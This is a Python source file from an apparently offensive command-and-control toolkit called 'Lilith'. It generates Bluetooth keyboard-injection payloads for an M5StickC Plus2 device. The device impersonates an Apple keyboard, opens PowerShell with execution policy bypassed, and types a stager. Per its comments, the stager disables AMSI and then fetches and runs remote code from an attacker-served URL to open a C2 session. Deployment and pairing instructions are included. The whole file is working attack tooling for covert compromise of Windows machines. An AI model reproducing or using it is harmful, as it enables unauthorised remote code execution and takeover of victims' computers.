"""
Lilith — BLE HID keystroke injection payload generator (M5StickC Plus2)

Two supported modes:

  m5stick — Custom Arduino sketch (ESP32-BLE-Keyboard + M5StickCPlus2 libs).
            Full UI: READY/FIRE/DONE on LCD, Button A trigger, Button B re-arm.
            Requires Arduino IDE compile + flash.

  bruce   — DuckyScript .txt payload for Bruce firmware (pr3y/Bruce).
            No compile step — copy to SD card /BadBLE/, select from Bruce menu.
            Bruce handles BLE advertisement, pairing, and keystroke injection.
            Fastest to deploy; Bruce is the standard choice for M5StickC Plus2.

Payload split (both modes):
  line1 = L1+L2+L3 (ZWSP setup + XOR key + AMSI bypass)
  line2 = L4-L10   (URL decode + TCP/TLS + fetch + ScriptBlock exec)
"""

import os
import re

from .stager import _compact_exec_loader

_BLE_CHUNK   = 80    # chars per print() call — keeps Windows BLE RX buffer happy
_BLE_GAP_MS  = 30   # ms between chunks
_DIALOG_MS   = 700  # Win+R dialog open
_PS_READY_MS = 1800 # PowerShell cold-start
_LINE_MS     = 400  # pause between line1 and line2
_EXIT_MS     = 2500 # wait for stager to launch before closing PS


def _esc_c(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')


def _chunked_prints(text: str, chunk: int = _BLE_CHUNK, gap: int = _BLE_GAP_MS) -> str:
    parts = []
    for i in range(0, len(text), chunk):
        piece = _esc_c(text[i:i + chunk])
        parts.append(f'  bleKbd.print("{piece}");')
        parts.append(f"  delay({gap});")
    return "\n".join(parts)


def _ble_m5stick(line1: str, line2: str, ble_name: str) -> str:
    l1_code = _chunked_prints(line1)
    l2_code = _chunked_prints(line2)

    return (
        "// Lilith BLE HID — M5StickC Plus2\n"
        "// Board  : M5StickC Plus2 (ESP32-S3)\n"
        "// Libs   : ESP32 BLE Keyboard (T-vK) + M5StickCPlus2\n\n"
        "#include <BleKeyboard.h>\n"
        "#include <M5StickCPlus2.h>\n\n"
        f'BleKeyboard bleKbd("{ble_name}", "Apple Inc.", 85);\n\n'
        "bool fired = false;\n\n"
        "void cls(uint16_t bg = BLACK) {\n"
        "  M5.Lcd.fillScreen(bg);\n"
        "  M5.Lcd.setCursor(0, 10);\n"
        "  M5.Lcd.setTextColor(WHITE);\n"
        "}\n\n"
        "void setup() {\n"
        "  M5.begin();\n"
        "  M5.Lcd.setRotation(3);\n"
        "  M5.Lcd.setTextSize(2);\n"
        "  cls();\n"
        '  M5.Lcd.println("LILITH BLE");\n'
        '  M5.Lcd.println("init...");\n'
        "  bleKbd.begin();\n"
        "}\n\n"
        "void loop() {\n"
        "  M5.update();\n\n"
        "  // No BLE connection — show pairing hint\n"
        "  if (!bleKbd.isConnected()) {\n"
        "    cls();\n"
        '    M5.Lcd.println("LILITH BLE");\n'
        f'    M5.Lcd.println("{ble_name}");\n'
        "    M5.Lcd.setTextColor(YELLOW);\n"
        '    M5.Lcd.println("pair target now");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        "    fired = false;\n"
        "    delay(1500);\n"
        "    return;\n"
        "  }\n\n"
        "  // Connected and not yet fired — show ready state\n"
        "  if (!fired) {\n"
        "    cls();\n"
        '    M5.Lcd.println("LILITH BLE");\n'
        "    M5.Lcd.setTextColor(GREEN);\n"
        '    M5.Lcd.println("READY");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        '    M5.Lcd.println("A = fire");\n'
        "  }\n\n"
        "  // Button A — inject payload\n"
        "  if (M5.BtnA.wasPressed() && !fired) {\n"
        "    fired = true;\n"
        "    cls(0x1082);\n"
        "    M5.Lcd.setTextColor(RED);\n"
        '    M5.Lcd.println("FIRING");\n'
        "    M5.Lcd.setTextColor(WHITE);\n\n"
        "    // Win+R\n"
        "    bleKbd.press(KEY_LEFT_GUI);\n"
        "    bleKbd.press('r');\n"
        "    delay(150);\n"
        "    bleKbd.releaseAll();\n"
        f"    delay({_DIALOG_MS});\n\n"
        "    // Open hidden PowerShell\n"
        '    bleKbd.print("powershell -ep bypass");\n'
        "    bleKbd.write(KEY_RETURN);\n"
        f"    delay({_PS_READY_MS});\n\n"
        "    // L1-L3: ZWSP type setup + XOR key + AMSI bypass\n"
        f"{l1_code}\n"
        "    bleKbd.write(KEY_RETURN);\n"
        f"    delay({_LINE_MS});\n\n"
        "    // L4-L10: URL decode + TLS fetch + ScriptBlock exec\n"
        f"{l2_code}\n"
        "    bleKbd.write(KEY_RETURN);\n"
        f"    delay({_EXIT_MS});\n\n"
        '    bleKbd.print("exit");\n'
        "    bleKbd.write(KEY_RETURN);\n\n"
        "    cls();\n"
        "    M5.Lcd.setTextColor(GREEN);\n"
        '    M5.Lcd.println("DONE");\n'
        "    M5.Lcd.setTextColor(WHITE);\n"
        '    M5.Lcd.println("~30s for session");\n'
        "  }\n\n"
        "  // Button B — reset fired flag (re-arm without re-pairing)\n"
        "  if (M5.BtnB.wasPressed()) {\n"
        "    fired = false;\n"
        "  }\n\n"
        "  delay(50);\n"
        "}\n"
    )


def _bruce(lines: list, ble_name: str) -> str:
    """DuckyScript payload for Bruce firmware BadBLE.

    Each of the 10 stager lines is typed individually (STRING + ENTER).
    ZWSP/invisible Unicode in L1+L2 cannot be typed via BLE HID — strip them.
    The -replace in L1/L2 becomes a no-op but type names arrive correct.
    """
    out = [
        "REM Lilith C2 stager - Bruce BadBLE",
        f"REM BLE name set in Bruce settings (current: {ble_name})",
        "REM Copy to SD card: /BadBLE/lilith.txt",
        "REM Bruce menu: BadBLE -> select lilith.txt -> run",
        "",
        "GUI r",
        f"DELAY {_DIALOG_MS}",
        "STRING powershell -ep bypass",
        "ENTER",
        f"DELAY {_PS_READY_MS}",
    ]
    for i, line in enumerate(lines):
        clean = re.sub(r'[^\x00-\x7f]', '', line)
        out.append(f"STRING {clean}")
        out.append("ENTER")
        out.append(f"DELAY {_LINE_MS}")
    out += [
        f"DELAY {_EXIT_MS}",
        "STRING exit",
        "ENTER",
    ]
    return "\n".join(out)


DEVICES = ("m5stick", "bruce")

_FILENAMES = {
    "m5stick": ("lilith_ble.ino", "open lilith_ble/ folder in Arduino IDE → select M5StickC Plus2 → upload"),
    "bruce":   ("lilith.txt",     "copy to SD card /BadBLE/lilith.txt → Bruce menu: BadBLE → lilith.txt → run"),
}

_GENERATORS = {
    "m5stick": _ble_m5stick,
    "bruce":   _bruce,
}


def build_ble_payload(
    stager_url: str,
    output_dir: str,
    device:     str = "m5stick",
    ble_name:   str = "Apple Wireless Keyboard",
) -> bool:
    """Generate a BLE HID keystroke payload sketch for the M5StickC Plus2.

    stager_url : full HTTPS URL served by 'lilith serve'
    output_dir : directory to write the sketch folder into
    device     : 'm5stick' (only supported device for now)
    ble_name   : BLE device name shown on target's pairing dialog
    """
    os.makedirs(output_dir, exist_ok=True)

    lines = _compact_exec_loader(stager_url)
    split = next((i for i, l in enumerate(lines) if "param($b)" in l), None)
    if split is None:
        print("[!] _compact_exec_loader: could not locate decoder line")
        return False
    line1 = ";".join(lines[:split + 1])
    line2 = ";".join(lines[split + 1:])

    targets = DEVICES if device == "all" else (device,)
    ok = False

    for dev in targets:
        if dev not in _GENERATORS:
            print(f"[!] Unknown BLE device '{dev}'  (valid: m5stick, bruce)")
            continue

        # Bruce gets the raw 10-line list (types each line individually).
        # m5stick gets the pre-joined 2-string pair (fewer BLE round-trips).
        if dev == "bruce":
            content = _bruce(lines, ble_name)
        else:
            content = _GENERATORS[dev](line1, line2, ble_name)
        filename, note   = _FILENAMES[dev]
        if dev == "m5stick":
            # Arduino IDE requires .ino inside a folder matching the sketch name
            sketch_name  = os.path.splitext(filename)[0]
            out_dir      = os.path.join(output_dir, sketch_name)
            os.makedirs(out_dir, exist_ok=True)
        else:
            # Bruce: flat file, no subfolder needed
            out_dir      = output_dir
        path             = os.path.join(out_dir, filename)

        with open(path, "w") as f:
            f.write(content)

        print(f"[+] {dev:<12} → {path}")
        print(f"    Deploy : {note}")
        ok = True

    if ok:
        l2_chars    = len(line2)
        chunks      = (l2_chars + _BLE_CHUNK - 1) // _BLE_CHUNK
        ble_type_s  = round(chunks * _BLE_GAP_MS / 1000)
        total_s     = (_DIALOG_MS + _PS_READY_MS + _LINE_MS + _EXIT_MS) // 1000 + ble_type_s + 3
        print(f"\n[*] Execution time estimate : ~{total_s}s total  (line2={l2_chars} chars)")
        if "bruce" in targets:
            print(f"    BLE name : set inside Bruce settings menu (use --ble-name for reference only)")
            print(f"    Trigger  : Bruce menu → BadBLE → lilith.txt → run")
        if "m5stick" in targets:
            print(f"    BLE name : '{ble_name}'  (--ble-name to change)")
            print(f"    Pair     : target Bluetooth → Add device → '{ble_name}'")
            print(f"    Trigger  : Button A (front face)")
            print(f"    Re-arm   : Button B (side) resets fired state without re-pairing")

    return ok
